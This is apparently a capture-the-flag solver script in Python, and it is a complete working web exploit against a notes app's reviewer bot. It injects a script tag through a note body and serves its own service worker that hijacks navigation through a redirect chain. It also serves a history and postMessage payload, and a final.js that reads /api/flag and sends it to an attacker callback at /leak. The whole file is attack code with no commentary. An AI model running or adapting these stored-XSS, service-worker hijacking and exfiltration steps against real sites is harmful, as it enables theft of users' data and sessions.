#!/usr/bin/env python3
import json
import queue
import re
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


ROOT = Path(__file__).resolve().parent
INTERNAL = "http://localhost:3000"
TIMEOUT = 35
FLAG_RE = re.compile(r"pwnsec\{[^}\r\n]+\}")
result: queue.Queue[object] = queue.Queue(maxsize=1)
events: list[str] = []


def fail(message: str) -> None:
    sys.stderr.write(message + "\n")
    raise SystemExit(1)


def load_endpoint(name: str) -> str:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    return endpoint["url"].rstrip("/")


def load_listener(name: str) -> tuple[str, int]:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    return endpoint["host"], endpoint["port"]


MAIN = load_endpoint("main")
CALLBACK = load_endpoint("callback")
LISTEN_HOST, LISTEN_PORT = load_listener("listener")


def request(url: str, data: dict[str, str] | None = None, timeout: int = 10):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method="POST" if body is not None else "GET")
    return urllib.request.urlopen(req, timeout=timeout)


def create_note() -> str:
    html = f'<script src="{CALLBACK}/final.js"></script>'
    if len(html) > 128:
        fail("callback URL is too long for the 128-byte note body limit")
    try:
        response = request(MAIN + "/create", {"title": "x", "html": html})
        final_url = response.geturl()
    except urllib.error.HTTPError as exc:
        fail(f"note creation failed: HTTP {exc.code}")
    note_id = urllib.parse.urlsplit(final_url).path.rsplit("/", 1)[-1]
    if not re.fullmatch(r"[0-9a-f]{20}", note_id):
        fail("note creation returned an unexpected location")
    return note_id


class ExploitHandler(BaseHTTPRequestHandler):
    def log_message(self, *_args) -> None:
        pass

    def send_bytes(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        url = urllib.parse.urlsplit(self.path)
        events.append(url.path)
        params = urllib.parse.parse_qs(url.query)

        if url.path == "/start":
            rid = params.get("rid", [""])[0]
            if not re.fullmatch(r"[0-9a-f]{24}", rid):
                self.send_bytes(400, b"missing rid", "text/plain")
                return
            review = INTERNAL + "/review?" + urllib.parse.urlencode({
                "rid": rid,
                "u": CALLBACK + "/payload.js",
            })
            sandbox = INTERNAL + "/sandbox?" + urllib.parse.urlencode({"rid": rid})
            page = (
                "<!doctype html><script>"
                "(async()=>{"
                "await navigator.serviceWorker.register('/sw.js');"
                "await navigator.serviceWorker.ready;"
                f"open({json.dumps(review)},'review');"
                "setTimeout(()=>location='/step?n=1&rid=" + rid + "',800)"
                "})()"
                "</script>"
            ).encode()
            self.send_bytes(200, page, "text/html; charset=utf-8")
            return

        if url.path == "/sw.js":
            script = (
                "addEventListener('fetch',e=>{const u=new URL(e.request.url);"
                "if(u.pathname!='/step')return;const n=+u.searchParams.get('n'),"
                "r=u.searchParams.get('rid'),q=n<40?'/step?n='+(n+1)+'&rid='+r:"
                + json.dumps(INTERNAL + "/sandbox?rid=")
                + "+r,c=n<40?\"setTimeout(()=>location=\"+JSON.stringify(q)+\",10)\":"
                "\"setTimeout(()=>{if(!sessionStorage.done){sessionStorage.done=1;location.replace(\""
                "+JSON.stringify(q)+\")}},10)\";e.respondWith(new Response('<link rel=icon href=data:,><script>addEventListener(\"load\",()=>{'+c+'})<\\/script>',"
                "{headers:{'content-type':'text/html','cache-control':'no-store'}}))})"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript; charset=utf-8")
            self.send_header("Content-Length", str(len(script)))
            self.send_header("Cache-Control", "no-store")
            self.send_header("Service-Worker-Allowed", "/")
            self.end_headers()
            self.wfile.write(script)
            return

        if url.path == "/payload.js":
            script = (
                "if(top===self){setTimeout(()=>history.go(2-history.length),1500)}"
                "else addEventListener('pagehide',()=>top.postMessage(1,'*'))"
            ).encode()
            self.send_bytes(200, script, "application/javascript; charset=utf-8")
            return

        if url.path == "/final.js":
            prefix = json.dumps(CALLBACK + "/leak?data=")
            script = (
                "const x=new XMLHttpRequest;x.open('GET','/api/flag',false);x.send();"
                f"location={prefix}+encodeURIComponent(x.responseText)"
            ).encode()
            self.send_bytes(200, script, "application/javascript; charset=utf-8")
            return

        if url.path == "/leak":
            candidate = params.get("data", [""])[0]
            match = FLAG_RE.search(candidate)
            if match:
                if result.empty():
                    result.put(match.group(0))
                self.send_bytes(200, b"ok", "text/plain")
            else:
                self.send_bytes(400, b"invalid leak", "text/plain")
            return

        self.send_bytes(200, b"ok", "text/plain")


def submit_report(note_id: str) -> None:
    report_url = CALLBACK + "/start?" + urllib.parse.urlencode({"note": note_id})
    try:
        request(MAIN + "/report", {"url": report_url}, timeout=TIMEOUT).read()
    except Exception as exc:
        if result.empty():
            result.put(exc)


def main() -> None:
    note_id = create_note()
    try:
        server = ThreadingHTTPServer((LISTEN_HOST, LISTEN_PORT), ExploitHandler)
    except OSError as exc:
        fail(f"cannot listen on port {LISTEN_PORT}: {exc}")

    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    threading.Thread(target=submit_report, args=(note_id,), daemon=True).start()
    try:
        value = result.get(timeout=TIMEOUT)
    except queue.Empty:
        server.shutdown()
        fail("timed out waiting for the reviewer; callback paths: " + ",".join(events))
    server.shutdown()
    if isinstance(value, Exception):
        fail(f"exploit failed: {value}")
    sys.stdout.buffer.write(str(value).encode("utf-8"))


if __name__ == "__main__":
    main()
